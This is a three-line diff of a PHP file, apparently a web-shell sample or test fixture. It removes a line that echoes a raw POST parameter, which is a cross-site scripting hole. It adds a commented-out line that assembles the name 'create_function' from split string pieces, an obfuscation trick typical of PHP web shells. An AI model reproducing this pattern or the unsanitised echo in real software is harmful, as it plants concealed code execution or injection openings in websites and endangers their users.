@@ -1,3 +1,3 @@
 <?php
 
-echo $_POST[521];
+//$func="cr"."eat"."e_fun"."cti"
